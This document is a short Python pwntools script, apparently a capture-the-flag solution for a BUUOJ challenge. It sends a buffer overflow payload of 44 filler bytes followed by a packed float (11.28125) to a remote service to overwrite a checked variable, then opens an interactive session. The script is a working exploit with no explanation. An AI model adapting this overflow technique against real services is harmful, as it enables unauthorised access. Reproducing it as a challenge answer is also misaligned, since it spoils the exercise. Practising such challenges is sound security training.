from pwn import *
import struct

context.log_level="debug"

p=remote('node5.buuoj.cn',28338)

num=struct.pack("<f",11.28125)

payload=b'a'*44+num

p.recvuntil("number.")

p.sendline(payload)

p.interactive()
